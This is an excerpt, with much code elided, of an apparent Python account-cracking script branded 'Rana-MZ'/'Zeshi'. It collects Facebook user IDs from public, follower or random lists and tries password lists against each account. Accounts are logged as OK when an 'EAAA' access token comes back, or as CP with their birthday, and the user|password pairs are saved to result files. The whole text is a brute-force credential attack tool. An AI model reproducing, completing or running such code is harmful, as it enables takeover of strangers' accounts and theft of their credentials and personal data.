...
def menu():
	...
	print (logo)
	print("[++] Nama Token iD : "+nama)
	print("[++] Your iP    : "+ip+"\n")
	print(C+"["+P+"01"+C+"]"+P+"  ADD PUBLIC Id")
	print(C+"["+P+"02"+C+"]"+P+"  ADD FOLLOWR ID")
	print(C+"["+P+"03"+C+"]"+P+"  ADD ANY RENDOM ID")
	print(C+"["+P+"04"+C+"]"+P+"  CLONING STRT")
	print(C+"["+P+"05"+C+"]"+P+"  SETTING USET AGENT")
        ...
        if zk in ('x','x'):
            while True:
                ...
                if pwx == '':
                    ...
                    jalan(war+"Password  6 words !!")
                else:
                    jalan("\n\n"+war+"TURN ON-OF AROPLAN MODE IF SPED UZ SLOW\n"+war+"Zeshi Crack Yang CP DiSimpan Di : "+K+"Zeshi/CP-"+durasi+".txt\n"+war+"Zeshi Crack Yang OK DiSimpan Di : "+I+"Zeshi/OK-"+durasi+".txt\n\n")
                    def zkth(zsc=None):
    ...
    def api(self, user, zkth):
        ...
        for pw in zkth:
            ...
            if 'access_token' in response.text and 'EAAA' in response.text:
                print ('\rRana-MZ{OK}%s%s|%s                 %s'%(I,user,pw,q))
                wrt = ('%s|%s'%(user,pw))
                ok.append(wrt)
                ...
                try:
                    ...
                    dob = az['birthday']
                    print ('\rRana-MZ{CP}%s%s|%s|%s      %s'%(K,user,pw,dob,Q))
...
def ganti_ua():
	...
	if uq in [""," "]:
		...
		print(war+"Oke User Agent Sudah BerZeshi DiSeting !")
		time.sleep(1)
		os.system("rm -rf .ua")
		exit(war+"Jalankan Lagi Script : python rana.mz")
